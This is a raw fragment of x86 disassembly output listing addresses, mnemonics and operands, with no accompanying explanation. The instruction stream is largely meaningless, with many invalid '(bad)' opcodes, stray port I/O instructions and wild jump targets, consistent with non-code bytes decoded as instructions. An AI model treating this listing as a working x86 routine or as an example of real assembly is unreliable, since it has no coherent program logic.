  43a4ad:	sbb    BYTE PTR [ebp-0x5e],dh
  43a4b0:	mov    esi,0xeb
  43a4b5:	add    BYTE PTR [eax],al
  43a4b7:	test   bh,0x35
  43a4ba:	je     0x43a491
  43a4bc:	sar    ch,1
  43a4be:	mov    bh,dh
  43a4c0:	sbb    ch,bh
  43a4c2:	push   DWORD PTR [ebp-0x5a]
  43a4c5:	andnps xmm7,xmm6
  43a4c8:	mov    WORD PTR [edi-0x70a307ec],cs
  43a4ce:	adc    ah,ch
  43a4d0:	gs sub eax,0xbea27585
  43a4d6:	idiv   eax
  43a4d8:	loope  0x43a489
  43a4da:	adc    edi,esi
  43a4dc:	or     ebp,DWORD PTR [eax+ecx*1]
  43a4df:	and    ch,BYTE PTR [esi+esi*1]
  43a4e2:	ret    0x34b0
  43a4e5:	add    al,0x83
  43a4e7:	xor    eax,0xb678f09d
  43a4ec:	mov    al,0xbf
  43a4ee:	imul   esi
  43a4f0:	inc    eax
  43a4f1:	cmp    al,0xfb
  43a4f4:	int    0x45
  43a4f6:	xor    BYTE PTR [eax+0x3c],0xfd
  43a4fa:	jae    0x43a491
  43a4fc:	mov    al,0xfe
  43a4fe:	jl     0x43a4dd
  43a500:	push   0xffffffa9
  43a502:	add    al,0xee
  43a504:	loop   0x43a505
  43a506:	cld    
  43a507:	ret    
  43a508:	daa    
  43a509:	add    DWORD PTR [eax],edi
  43a50b:	retf   0x7ed
  43a50e:	test   DWORD PTR [ebx],esi
  43a510:	sbb    eax,0x186d528a
  43a515:	inc    esi
  43a516:	sub    eax,0x53364f81
  43a51b:	add    BYTE PTR [eax],al
  43a51d:	add    BYTE PTR [eax],al
  43a51f:	add    BYTE PTR [ecx-0x50],bh
  43a522:	mov    edi,0xd90b42f3
  43a527:	test   BYTE PTR [eax+0x38c14115],dl
  43a52d:	mov    ch,0xfc
  43a52f:	push   DWORD PTR [ebp+0x2]
  43a532:	out    0x2e,eax
  43a534:	scas   al,BYTE PTR es:[edi]
  43a535:	jbe    0x43a4db
  43a537:	adc    edi,edx
  43a539:	jmp    0x23235c03
  43a53e:	aam    0xec
  43a540:	jmp    0xa0646c2c
  43a545:	add    ah,bh
  43a547:	scas   eax,DWORD PTR es:[edi]
  43a548:	jp     0x43a4e4
  43a54a:	(bad)  
  43a54b:	and    BYTE PTR [eax+0x49be3f02],dl
  43a551:	sub    ah,bh
  43a553:	xchg   BYTE PTR [ecx],bh
  43a555:	jmp    DWORD PTR [ebx+0x43]
  43a558:	sar    ecx,0x5d
  43a55b:	enter  0x9c82,0xe7
  43a55f:	aam    0x2d
  43a561:	adc    BYTE PTR [edi+0x66026020],al
  43a567:	aas    
  43a568:	ins    DWORD PTR es:[edi],dx
  43a569:	jge    0x43a50f
  43a56b:	nop    DWORD PTR [edx-0x17]
  43a56f:	cmp    DWORD PTR [esi+edi*2],ecx
  43a572:	sub    al,0x10
  43a574:	dec    edx
  43a575:	retf   0xafea
  43a578:	imul   edi,DWORD PTR [ebp+0x3c],0xc
  43a57c:	inc    ebx
  43a57d:	rcr    DWORD PTR [ebp+0x55],1
  43a580:	lock cmp cl,bh
  43a583:	jne    0x43a585
  43a585:	add    BYTE PTR [eax],al
  43a587:	add    BYTE PTR [eax],al
  43a589:	fild   QWORD PTR [ecx]
  43a58b:	mov    edx,0x5e0e368d
  43a590:	(bad)  
  43a591:	retf   0x1f7b
  43a594:	or     al,dh
  43a596:	add    BYTE PTR [esi+0x3c],ah
  43a599:	mov    edi,0x2f8cedae
  43a59e:	(bad)  
  43a59f:	in     eax,0x48
  43a5a1:	pusha  
  43a5a2:	test   dh,0x38
  43a5a5:	inc    esi
  43a5a6:	imul   BYTE PTR [ebp-0x36]
  43a5a9:	outs   dx,BYTE PTR ds:[esi]
  43a5aa:	jge    0x43a5bd
  43a5ac:	or     al,0x98
  43a5ae:	cmp    BYTE PTR [eax],al
  43a5b0:	mov    edx,0x14f8f07a
  43a5b5:	jge    0x43a636
  43a5b7:	inc    ebx
  43a5b8:	pop    ecx
  43a5b9:	lock mov edx,0x1a247207
  43a5bf:	inc    esi
  43a5c0:	push   edi
  43a5c1:	lods   al,BYTE PTR ds:[esi]
  43a5c2:	sub    esi,DWORD PTR [esi-0x6d453b1]
  43a5c8:	add    BYTE PTR [eax-0x3],cl
  43a5cb:	or     BYTE PTR [ebp+0x44],ah
  43a5ce:	sub    bh,cl
  43a5d0:	add    BYTE PTR ss:[ebp+0x7e259807],bh
  43a5d7:	lds    edx,FWORD PTR [ecx]
  43a5d9:	sbb    BYTE PTR [ebx],ch
  43a5db:	stc    
  43a5dc:	push   ds
  43a5dd:	mov    fs,esp
  43a5df:	clc    
  43a5e0:	push   ss
  43a5e1:	ins    BYTE PTR es:[edi],dx
  43a5e2:	sub    esp,DWORD PTR [ebx]
  43a5e4:	test   eax,0x5ffc284
  43a5e9:	inc    edx
  43a5ea:	rcl    DWORD PTR [ecx],0xa9
  43a5ed:	add    BYTE PTR [eax],al
  43a5ef:	add    BYTE PTR [eax],al
  43a5f1:	add    BYTE PTR [esi+0x36],dh
  43a5f4:	int3   
  43a5f5:	sahf   
  43a5f6:	and    al,0xb6
  43a5f8:	sub    al,0xee
  43a5fa:	stc    
  43a5fb:	mov    ebp,0x4271fd23
  43a600:	jnp    0x43a5f7
  43a602:	xor    eax,0x890d547e
  43a607:	xor    ebx,eax
  43a609:	(bad)  
  43a60a:	dec    eax
  43a60b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a60c:	xlat   BYTE PTR ds:[ebx]
  43a60d:	jmp    0xd5676401
  43a612:	out    dx,eax
  43a613:	int    0x23
  43a615:	fld    DWORD PTR [ecx]
  43a617:	mov    esi,0x4279cd23
  43a61c:	jnp    0x43a61b
  43a61e:	mov    ch,0x7d
  43a620:	push   esp
  43a621:	lds    ebx,FWORD PTR [esi+0x33]
  43a624:	fcomp  DWORD PTR [esi-0x162858b0]
  43a62a:	(bad)  
  43a62b:	mov    ebp,0x7b980023
  43a630:	push   esp
  43a631:	and    al,0x94
  43a633:	cmc    
  43a634:	mov    edi,0x4c75a475
  43a639:	and    al,0xa4
  43a63b:	jne    0x43a681
  43a63d:	and    al,0x80
  43a63f:	sub    eax,0x761df7cb
  43a644:	fmul   DWORD PTR [ebx-0x8f6b7e0]
  43a64a:	int    0x76
  43a64c:	retf   
  43a64d:	jmp    0x43a65c
  43a64f:	ja     0x43a629
  43a651:	mov    ecx,DWORD PTR [eax]
  43a653:	dec    eax
  43a654:	adc    DWORD PTR [ebx+0x0],ecx
  43a65a:	add    al,dh
  43a65c:	inc    edi
  43a65d:	or     eax,0x948108b
  43a662:	shl    DWORD PTR [edi-0x2c],1
  43a665:	rcl    cl,1
  43a667:	data16 aam 0xd7
  43a66a:	or     esp,DWORD PTR [edi+0x58]
  43a66d:	in     eax,dx
  43a66e:	test   DWORD PTR [ebp-0xf080f8a],0x648b1547
  43a678:	jbe    0x43a6be
  43a67a:	and    al,0x24
  43a67c:	repz fld QWORD PTR [ebx]
  43a67f:	ins    DWORD PTR es:[edi],dx
  43a680:	ins    DWORD PTR es:[edi],dx
  43a681:	pop    es
  43a682:	cmp    eax,DWORD PTR [eax+0x22]
  43a685:	or     eax,0x720477
  43a68a:	cmp    esp,DWORD PTR [eax-0x2289f6de]
  43a690:	cmp    eax,0xe867d22c
  43a695:	inc    esi
  43a696:	jne    0x43a66b
  43a698:	fcom   st(1)
  43a69a:	mul    esp
  43a69c:	adc    edx,0x0
  43a69f:	addr16 push eax
  43a6a1:	pop    eax
  43a6a2:	ret    0x3bc
  43a6a5:	cmp    edi,0xffffff81
  43a6a8:	jnp    0x43a696
  43a6aa:	xor    DWORD PTR [ebp+0x7d],0x19aafcec
  43a6b1:	pop    esi
  43a6b2:	shr    BYTE PTR [ebp+0x688703dc],1
  43a6b8:	push   ebp
  43a6b9:	dec    esp
  43a6ba:	cmp    eax,0xc80ea275
  43a6bf:	add    BYTE PTR [eax],al
  43a6c1:	add    BYTE PTR [eax],al
  43a6c3:	add    BYTE PTR [ebp+0x608703dc],bh
  43a6c9:	aad    0x4b
  43a6cb:	cmp    eax,0xbfeeb275
  43a6d0:	cmp    eax,0xa886fd5c
  43a6d5:	jne    0x43a723
  43a6d7:	cmp    eax,0x13813775
  43a6dc:	dec    ebp
  43a6dd:	icebp  
  43a6de:	mov    esp,0x69dd8ff
  43a6e3:	fdivr  QWORD PTR ds:0xf161fd5c
  43a6e9:	std    
  43a6ea:	jnp    0x43a6b4
  43a6ec:	mov    dh,0x19
  43a6ee:	fwait
  43a6ef:	mov    edi,DWORD PTR [eax-0x3b]
  43a6f2:	dec    ebx
  43a6f3:	cmp    eax,0x23817f75
  43a6f8:	in     eax,0xf0
  43a6fa:	mov    esp,0xe69590ff
  43a6ff:	stos   DWORD PTR es:[edi],eax
  43a700:	cmp    eax,0xfa9bfd5c
  43a705:	sbb    eax,0x19b6c81d
  43a70a:	xchg   BYTE PTR [ebx+0x75],al
  43a70d:	jl     0x43a758
  43a70f:	enter  0x1936,0x86
  43a713:	inc    ebx
  43a714:	jno    0x43a792
  43a716:	push   ebp
  43a717:	enter  0x1936,0x88
  43a71b:	inc    ebx
  43a71c:	ins    DWORD PTR es:[edi],dx
  43a71d:	jl     0x43a738
  43a71f:	enter  0x1936,0x86
  43a723:	adc    ebp,0x54
  43a726:	xor    bh,cl
  43a728:	add    BYTE PTR [eax],al
  43a72a:	add    BYTE PTR [eax],al
  43a72c:	add    BYTE PTR [edx-0x4d1c13ff],bh
  43a732:	ret    0x4e6
  43a735:	jne    0x43a738
  43a737:	out    0x64,eax
  43a739:	int    0x39
  43a73b:	es add al,0x0
  43a73e:	inc    esi
  43a73f:	stos   BYTE PTR es:[edi],al
  43a740:	ret    0x3f9a
  43a743:	in     al,0x53
  43a745:	mov    ah,0xc2
  43a747:	out    0xc,al
  43a749:	jno    0x43a74d
  43a74b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a74c:	ds jbe 0x43a79d
  43a74f:	sub    al,dl
  43a751:	jp     0x43a754
  43a753:	out    0x3,eax
  43a755:	jne    0x43a7ba
  43a757:	stos   DWORD PTR es:[edi],eax
  43a758:	inc    ebx
  43a759:	test   al,0x2
  43a75b:	pusha  
  43a75c:	cmp    BYTE PTR ds:0xfa364227,0xba
  43a763:	es ret 0x7b52
  43a767:	ins    BYTE PTR es:[edi],dx
  43a768:	push   edi
  43a769:	dec    ecx
  43a76a:	sub    ch,BYTE PTR es:[ecx+0x3fc2542]
  43a771:	imul   eax,edx,0xffffffe6
  43a774:	stos   DWORD PTR es:[edi],eax
  43a775:	jbe    0x43a72b
  43a777:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43a778:	add    ebp,DWORD PTR [eax+edx*1]
  43a77b:	jecxz  0x43a78e
  43a77d:	mov    ch,0x2
  43a77f:	(bad)  
  43a780:	or     al,0x71
  43a782:	add    ah,BYTE PTR [edi]
  43a784:	ss data16 cli 
  43a787:	aam    0xc3
  43a789:	or     dh,BYTE PTR [esi+0x13dd0fe9]
  43a78f:	daa    
  43a790:	add    al,0x0
  43a792:	add    BYTE PTR [eax],al
  43a794:	add    BYTE PTR [eax],al
  43a796:	xor    al,BYTE PTR [edx-0x55]
  43a799:	dec    eax
  43a79a:	shl    DWORD PTR [esi],0x39
  43a79d:	mov    DWORD PTR [ecx],esi
  43a79f:	fdivrp st(2),st
  43a7a1:	or     BYTE PTR [ebp+0x29890eaf],dh
  43a7a7:	(bad)  
  43a7a9:	mov    BYTE PTR [ecx],bh
  43a7ab:	fdivp  st(7),st
  43a7ad:	in     al,0xc5
  43a7af:	aaa    
  43a7b0:	icebp  
  43a7b1:	mov    eax,0x2d854aec
  43a7b6:	aad    0xfd
  43a7b8:	lock cwde 
  43a7ba:	cld    
  43a7bb:	xor    al,BYTE PTR [ebp+0x239e58aa]
  43a7c1:	stc    
  43a7c2:	in     eax,dx
  43a7c3:	cmp    al,BYTE PTR [ebp+0x239e48af]
  43a7c9:	fnstenv [ebp+0x35]
  43a7cc:	in     eax,0x2e
  43a7ce:	cld    
  43a7cf:	cmp    al,BYTE PTR [ebp-0x7b0a6af3]
  43a7d5:	mov    ebp,0xa584f99a
  43a7da:	push   edx
  43a7db:	std    
  43a7dc:	into   
  43a7dd:	inc    eax
  43a7de:	(bad)  
  43a7df:	dec    edi
  43a7e0:	iret   
  43a7e1:	inc    ebx
  43a7e2:	(bad)  
  43a7e3:	dec    edx
  43a7e4:	add    eax,0xf1310a30
  43a7e9:	cmp    bh,ah
  43a7eb:	xor    ecx,esi
  43a7ed:	int    0x2a
  43a7ef:	adc    DWORD PTR [ebp+0x23bdec21],eax
  43a7f5:	stc    
  43a7f6:	mov    DWORD PTR [eax],esp
  43a7f8:	std    
  43a7f9:	aaa    
  43a7fa:	add    BYTE PTR [eax],al
  43a7fc:	add    BYTE PTR [eax],al
  43a7fe:	add    bh,ah
  43a800:	cli    
  43a801:	xor    al,0xbd
  43a803:	dec    edx
  43a804:	stc    
  43a805:	jo     0x43a7e8
  43a807:	in     al,0xf9
  43a809:	xor    al,0xad
  43a80b:	cmp    bh,ch
  43a80d:	jno    0x43a7ff
  43a80f:	cmp    dh,bl
  43a811:	inc    ebx
  43a812:	int    0x66
  43a814:	andps  xmm0,xmm5
  43a817:	jb     0x43a7f0
  43a819:	aam    0x12
  43a81b:	xor    eax,0xc50207e1
  43a820:	loopne 0x43a82d
  43a822:	fimul  WORD PTR [ebx+esi*1-0x28]
  43a826:	push   0x3c
  43a828:	add    al,BYTE PTR [ebp-0x3485da00]
  43a82e:	mov    edx,DWORD PTR ds:0x1a8bc87a
  43a834:	dec    edi
  43a835:	mov    ebx,0xcbbccc10
  43a83a:	int3   
  43a83b:	jg     0x43a88e
  43a83d:	mov    ah,0x50
  43a83f:	fadd   QWORD PTR [ecx-0x7]
  43a842:	jmp    0xbe5c:0xbb4a5197
  43a849:	cmp    al,BYTE PTR [eax]
  43a84b:	daa    
  43a84c:	cmp    eax,0x3a050c1d
  43a851:	add    DWORD PTR [ecx+0x6b81025f],ecx
  43a857:	mov    al,ds:0xb4504a33
  43a85c:	inc    edi
  43a85d:	push   esi
  43a85e:	pop    ecx
  43a85f:	aaa    
  43a860:	ret    0x3
  43a863:	add    BYTE PTR [eax],al
  43a865:	add    BYTE PTR [eax],al
  43a867:	add    bl,al
  43a869:	iret   
  43a86a:	mov    edx,0xcbbb80cc
  43a86f:	int3   
  43a870:	mov    al,ds:0xa0cccbbb
  43a875:	mov    ebx,0xeed7cccb
  43a87a:	dec    esp
  43a87b:	mov    eax,DWORD PTR [eax-0x2bf7ba86]
  43a881:	cmp    al,0x53
  43a883:	add    BYTE PTR [esi+eax*4],bl
  43a886:	xor    al,BYTE PTR [ecx]
  43a888:	or     BYTE PTR [esp+ebp*1],ah
  43a88b:	rcl    cl,0xc2
  43a88e:	add    BYTE PTR [ecx+0x30],0x3
  43a892:	mov    ecx,0x3e503481
  43a897:	add    BYTE PTR [edx*2-0x57a1cc18],bl
  43a89e:	add    al,BYTE PTR [ecx]
  43a8a0:	or     al,0x0
  43a8a2:	pop    esi
  43a8a3:	cmp    DWORD PTR [esi+esi*8+0x57759406],esp
  43a8aa:	jns    0x43a86a
  43a8ac:	inc    eax
  43a8ad:	pop    eax
  43a8ae:	inc    eax
  43a8af:	int3   
  43a8b0:	test   eax,0xc1cc406d
  43a8b5:	push   ebp
  43a8b6:	inc    eax
  43a8b7:	int3   
  43a8b8:	mov    ecx,0xee532ca0
  43a8bd:	gs jns 0x43a903
  43a8c0:	ins    DWORD PTR es:[edi],dx
  43a8c1:	mov    al,0xbb
  43a8c3:	cmp    esi,DWORD PTR [esi+0x71]
  43a8c6:	std    
  43a8c7:	mov    al,0x34
  43a8c9:	and    eax,0x51d2
  43a8ce:	add    BYTE PTR [eax],al
  43a8d0:	add    BYTE PTR [edx-0x34],dh
  43a8d3:	mov    dl,0x1
  43a8d5:	xchg   bp,dx
  43a8d8:	mov    bh,BYTE PTR [ecx]
  43a8da:	xor    DWORD PTR ds:0xa238383,eax
  43a8e0:	test   DWORD PTR [eax],eax
  43a8e2:	inc    ebp
  43a8e3:	jp     0x43a92d
  43a8e5:	imul   esp,eax,0xb07c6e2a
  43a8eb:	retf   
  43a8ec:	pop    es
  43a8ed:	jbe    0x43a8e1
  43a8ef:	call   0xc36390e8
  43a8f4:	jl     0x43a92b
  43a8f6:	adc    ecx,ebp
  43a8f8:	rol    edi,1
  43a8fa:	shl    eax,1
  43a8fc:	mov    edi,0x5aca8baa
  43a901:	ss aas 
  43a903:	cmc    
  43a904:	addr16 popf 
  43a906:	xchg   edx,eax
  43a908:	call   FWORD PTR [edx]
  43a90a:	lods   eax,DWORD PTR ds:[esi]
  43a90b:	add    eax,DWORD PTR [eax]
  43a90d:	jne    0x43a8a7
  43a90f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43a910:	sti    
  43a911:	jne    0x43a8c6
  43a913:	add    eax,DWORD PTR [eax]
  43a915:	mov    ch,0x19
  43a917:	xlat   BYTE PTR ds:[ebx]
  43a918:	out    0x94,eax
  43a91a:	and    al,0x2e
  43a91c:	stc    
  43a91d:	lods   al,BYTE PTR ds:[esi]
  43a91e:	xchg   esi,eax
  43a91f:	inc    ebx
  43a920:	je     0x43a962
  43a922:	mov    al,ds:0x24e07c6
  43a927:	test   eax,0x771a44d3
  43a92c:	xor    ch,ah
  43a92e:	and    dh,BYTE PTR [eax]
  43a930:	int    0xf7
  43a932:	inc    ecx
  43a933:	push   ebx
  43a934:	fild   WORD PTR [eax]
  43a936:	add    BYTE PTR [eax],al
  43a938:	add    BYTE PTR [eax],al
  43a93a:	icebp  
  43a93b:	ror    DWORD PTR [edx],0x45
  43a93e:	fld    QWORD PTR [edx]
  43a940:	mov    dl,0x53
  43a942:	dec    eax
  43a943:	and    ch,al
  43a945:	dec    edx
  43a946:	ss es test eax,0x8e22bc32
  43a94d:	jecxz  0x43a948
  43a94f:	mov    esp,0x77757e8a
  43a954:	out    0xf6,eax
  43a956:	mov    ebx,0x7503e3e4
  43a95b:	inc    edx
  43a95c:	repnz xchg edi,eax
  43a95e:	shl    BYTE PTR [esi-0x58],cl
  43a961:	inc    esi
  43a962:	lock pushf 
  43a964:	jle    0x43a9b0
  43a966:	ss imul esi,DWORD PTR es:[edx],0x4416227c
  43a96e:	pop    ebp
  43a96f:	popf   
  43a970:	out    0x3,al
  43a972:	jne    0x43a9b9
  43a974:	pop    esi
  43a975:	(bad)  
  43a976:	xchg   esi,eax
  43a977:	or     bl,BYTE PTR [esi-0x41]
  43a97a:	xchg   esi,eax
  43a97b:	repnz in eax,dx
  43a97d:	cmp    edi,eax
  43a97f:	into   
  43a980:	add    al,BYTE PTR [eax]
  43a982:	(bad)  
  43a983:	or     ebx,DWORD PTR [esi-0x39]
  43a986:	xchg   esi,eax
  43a987:	push   es
  43a988:	xor    ah,BYTE PTR [ebx+edi*8]
  43a98b:	repnz out 0xd6,al
  43a98e:	and    eax,0xf04b6e24
  43a993:	(bad)  
  43a994:	retf   0x25fb
  43a997:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a998:	ret    0x1817
  43a99b:	cmp    ch,BYTE PTR [esi-0x39]
  43a99e:	add    BYTE PTR [eax],al
  43a9a0:	add    BYTE PTR [eax],al
  43a9a2:	add    BYTE PTR [esi+0xa],dl
  43a9a5:	repnz and ecx,DWORD PTR [eax]
  43a9a8:	xor    eax,0xf2b89200
  43a9ad:	inc    DWORD PTR [eax-0x16c34f2b]
  43a9b3:	sbb    bl,BYTE PTR [ebx]
  43a9b5:	xor    ebp,ecx
  43a9b7:	jbe    0x43a9bb
  43a9b9:	add    BYTE PTR [edx-0x53],ah
  43a9bc:	in     eax,0xf
  43a9be:	pusha  
  43a9bf:	adc    eax,0x15740fe6
  43a9c4:	out    0xf,al
  43a9c6:	adc    dl,BYTE PTR [ecx+0x561e51cf]
  43a9cc:	(bad)  
  43a9cd:	mov    edi,0x42f1712a
  43a9d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43a9d3:	test   al,0x44
  43a9d5:	push   eax
  43a9d6:	jo     0x43a9aa
  43a9d8:	sub    ecx,edi
  43a9da:	sbb    al,0x51
  43a9dc:	xchg   DWORD PTR [ebx-0x73],eax
  43a9df:	sub    al,0xc5
  43a9e1:	sti    
  43a9e2:	xchg   DWORD PTR [ebx+ebx*1-0x7],eax
  43a9e6:	jo     0x43a99a
  43a9e8:	sbb    DWORD PTR [ebx-0x6359b6d4],ecx
  43a9ee:	jmp    0x2a43ac69
  43a9f3:	lock int 0xef
  43a9f6:	(bad)
  43a9f9:	add    cl,ch
  43a9fb:	jbe    0x43a9ff
  43a9fd:	push   edi
  43a9fe:	scas   al,BYTE PTR es:[edi]
  43a9ff:	inc    ebp
  43aa00:	mov    ebx,0xbd9a7254
  43aa05:	dec    esi
  43aa06:	sub    al,BYTE PTR [eax]
  43aa08:	add    BYTE PTR [eax],al
  43aa0a:	add    BYTE PTR [eax],al
  43aa0c:	enter  0x531b,0x62
  43aa10:	xchg   ebp,eax
  43aa11:	sbb    esi,DWORD PTR [ebx-0x2b]
  43aa14:	test   DWORD PTR [ebp+0xcea260f],edx
  43aa1a:	stc    
  43aa1b:	xchg   esp,eax
  43aa1c:	cs test eax,0x21398e4f
  43aa22:	popa   
  43aa23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43aa24:	mov    dh,0xdf
  43aa26:	(bad)  
  43aa27:	jmp    DWORD PTR [edi+edx*2-0xd]
  43aa2b:	dec    DWORD PTR [ebx]
  43aa2d:	xchg   ah,al
  43aa2f:	sbb    cl,ch
  43aa31:	(bad)
  43aa34:	sbb    bh,dh
  43aa36:	aas    
  43aa37:	add    BYTE PTR [edi-0x39],ah
  43aa3a:	mov    edx,0x68fe4490
  43aa3f:	inc    ebx
  43aa40:	int3   
  43aa41:	push   0x4cc009a
  43aa46:	add    BYTE PTR [eax+0x47],dl
  43aa49:	dec    ecx
  43aa4a:	sbb    eax,0x1d814510
  43aa4f:	adc    BYTE PTR [ecx-0x7f],bl
  43aa52:	sbb    eax,0x4ae67710
  43aa57:	push   esi
  43aa58:	jae    0x43a9f9
  43aa5a:	cmp    al,0xf8
  43aa5c:	and    eax,0x1750e168
  43aa61:	dec    eax
  43aa62:	cmc    
  43aa63:	(bad)  
  43aa64:	push   ecx
  43aa65:	shl    dh,cl
  43aa67:	(bad)  
  43aa68:	sti    
  43aa69:	rol    DWORD PTR [eax+0x3c9ff445],1
  43aa6f:	lock add BYTE PTR [eax],al
  43aa72:	add    BYTE PTR [eax],al
  43aa74:	add    BYTE PTR [eax-0x59],dh
  43aa77:	(bad)  
  43aa78:	dec    DWORD PTR [esp+eax*1-0x2bd67445]
  43aa7f:	arpl   WORD PTR [ecx+0x459],cx
  43aa85:	dec    esp
  43aa86:	dec    ebp
  43aa87:	pop    eax
  43aa88:	pop    esi
  43aa89:	daa    
  43aa8a:	fisttp QWORD PTR [eax-0x3d]
  43aa8d:	mov    ebx,0x1c166928
  43aa92:	add    al,0xcc
  43aa94:	int3   
  43aa95:	fistp  QWORD PTR [ecx]
  43aa97:	test   BYTE PTR [eax+esi*2+0xe],al
  43aa9b:	add    eax,eax
  43aa9d:	adc    DWORD PTR [ebx+eax*4],ecx
  43aaa0:	dec    esp
  43aaa1:	xor    al,bh
  43aaa3:	add    BYTE PTR [ebp+esi*2+0x4d],0xd
  43aaa8:	sub    eax,0x852df947
  43aaad:	sub    eax,0x7923c095
  43aab2:	sbb    BYTE PTR [edi],ch
  43aab4:	test   DWORD PTR [esi],esp
  43aab6:	add    eax,0xa52d84be
  43aabb:	enter  0x8923,0x94
  43aabf:	xlat   BYTE PTR ds:[ebx]
  43aac0:	and    eax,DWORD PTR [ebp+0x7123c794]
  43aac6:	pop    edx
  43aac7:	sbb    ecx,edi
  43aac9:	mov    esi,0xadcf165a
  43aace:	adc    al,0x3c
  43aad0:	jae    0x43aa93
  43aad2:	pop    eax
  43aad3:	sub    eax,0xa860c585
  43aad8:	and    eax,DWORD PTR [eax]
  43aada:	add    BYTE PTR [eax],al
  43aadc:	add    BYTE PTR [eax],al
  43aade:	pop    ebp
  43aadf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43aae0:	cmp    eax,DWORD PTR [ebp-0xeeeb2c7]
  43aae6:	xchg   ebx,eax
  43aae7:	sub    al,0x54
  43aae9:	outs   dx,BYTE PTR ds:[esi]
  43aaea:	jae    0x43ab20
  43aaec:	shl    DWORD PTR [ebx],1
  43aaee:	test   eax,edi
  43aaf0:	sti    
  43aaf1:	ins    DWORD PTR es:[edi],dx
  43aaf2:	jp     0x43ab38
  43aaf4:	shl    DWORD PTR [ebx],0x79
  43aaf7:	pop    ss
  43aaf8:	add    al,0x4a
  43aafa:	inc    esi
  43aafb:	jnp    0x43ab72
  43aafd:	ret    0xf41b
  43ab00:	cmp    eax,0x28a77510
  43ab05:	stc    
  43ab06:	push   0x29
  43ab08:	std    
  43ab09:	push   DWORD PTR [ebp-0x2f]
  43ab0c:	sub    cl,bh
  43ab0e:	pop    edx
  43ab0f:	sub    ebp,edi
  43ab11:	push   DWORD PTR [ebp-0x39]
  43ab14:	sub    cl,bh
  43ab16:	dec    edx
  43ab17:	xor    DWORD PTR [esp+edi*1+0x3cb3e775],0x75
  43ab1f:	sub    ebp,edi
  43ab21:	push   DWORD PTR [ebp+0x2]
  43ab24:	and    ch,BYTE PTR [edi]
  43ab26:	sub    al,0x1f
  43ab28:	push   eax
  43ab29:	lods   eax,DWORD PTR ds:[esi]
  43ab2a:	pusha  
  43ab2b:	add    al,BYTE PTR [ebp+ebp*4+0x58]
  43ab2f:	add    ah,bh
  43ab31:	add    esi,DWORD PTR [ebp+0x2]
  43ab34:	add    ch,BYTE PTR [edi]
  43ab36:	or     al,0x1f
  43ab38:	lahf   
  43ab39:	lods   al,BYTE PTR ds:[esi]
  43ab3a:	inc    eax
  43ab3b:	add    dl,BYTE PTR [ebx-0x18fdc754]
  43ab41:	add    eax,DWORD PTR [eax]
  43ab43:	add    BYTE PTR [eax],al
  43ab45:	add    BYTE PTR [eax],al
  43ab47:	jne    0x43ab4b
  43ab49:	loop   0x43ab79
  43ab4b:	in     al,dx
  43ab4c:	push   ds
  43ab4d:	sti    
  43ab4e:	lods   al,BYTE PTR ds:[esi]
  43ab4f:	mov    al,ds:0x98ad0702
  43ab54:	add    ah,bh
  43ab56:	add    esi,DWORD PTR [ebp+0x2]
  43ab59:	ret    0xcc2e
  43ab5c:	push   ds
  43ab5d:	cld    
  43ab5e:	stos   DWORD PTR es:[edi],eax
  43ab5f:	add    BYTE PTR [edx],0x28
  43ab62:	lods   al,BYTE PTR ds:[esi]
  43ab63:	js     0x43ab67
  43ab65:	out    0x3,eax
  43ab67:	jne    0x43ab6b
  43ab69:	mov    ds:0x8a1eac2e,al
  43ab6e:	mov    dh,0x60
  43ab70:	add    dl,BYTE PTR [esi-0x18fda74a]
  43ab76:	add    esi,DWORD PTR [ebp+0x2]
  43ab79:	sub    BYTE PTR [esi],0x8c
  43ab7c:	push   ds
  43ab7d:	ss mov dh,0x40
  43ab80:	add    bh,BYTE PTR [edx]
  43ab82:	mov    dh,0x38
  43ab84:	add    ah,bh
  43ab86:	add    esi,DWORD PTR [ebp+0x2]
  43ab89:	bound  ebp,QWORD PTR [esi]
  43ab8b:	ins    BYTE PTR es:[edi],dx
  43ab8c:	push   ds
  43ab8d:	fidiv  WORD PTR [esi-0x492dfd60]
  43ab93:	cwde   
  43ab94:	add    ah,bh
  43ab96:	add    esi,DWORD PTR [ebp+0x2]
  43ab99:	inc    edx
  43ab9a:	cs dec esp
  43ab9c:	push   ds
  43ab9d:	out    0x86,al
  43ab9f:	add    BYTE PTR [edx],0x0
  43aba2:	out    dx,al
  43aba3:	repz (bad) 
  43aba6:	call   0x2643ae21
  43abab:	add    BYTE PTR [eax],al
  43abad:	add    BYTE PTR [eax],al
  43abaf:	add    BYTE PTR [ebx+0x1b],bl
  43abb2:	stc    
  43abb3:	sub    al,bh
  43abb5:	(bad)  
  43abb7:	sub    esi,eax
  43abb9:	(bad)  
  43abbb:	call   0x643ae36
  43abc0:	pop    ebx
  43abc1:	sbb    edi,ecx
  43abc3:	fwait
  43abc4:	push   cs
  43abc5:	(bad)  
  43abc7:	sahf   
  43abc8:	push   cs
  43abc9:	(bad)  
  43abcb:	call   0xe643ae46
  43abd0:	cwde   
  43abd1:	sbb    edi,ecx
  43abd3:	aam    0x81
  43abd5:	ret    0xcfff
  43abd8:	jns    0x43ab9c
  43abda:	(bad)  
  43abdb:	call   0xc643ae56
  43abe0:	cwde   
  43abe1:	sbb    edi,ecx
  43abe3:	inc    eax
  43abe4:	popa   
  43abe5:	ret    0x33ff
  43abe8:	pop    ecx
  43abe9:	ret    0xe8ff
  43abec:	jbe    0x43abf0
  43abee:	add    BYTE PTR [esi-0x3206e4a8],ah
  43abf4:	pop    ecx
  43abf5:	ret    0xd8ff
  43abf8:	push   ecx
  43abf9:	ret    0xe8ff
  43abfc:	jbe    0x43ac00
  43abfe:	add    BYTE PTR [esi+0x20f91b58],al
  43ac04:	pop    ebx
  43ac05:	ret    0x13ff
  43ac08:	push   ebx
  43ac09:	ret    0xe8ff
  43ac0c:	jbe    0x43ac10
  43ac0e:	add    BYTE PTR [esi-0x68],ah
  43ac11:	sbb    edi,ecx
  43ac13:	add    BYTE PTR [eax],al
  43ac15:	add    BYTE PTR [eax],al
  43ac17:	add    BYTE PTR [eax],al
  43ac19:	lods   eax,DWORD PTR ds:[esi]
  43ac1a:	(bad)  
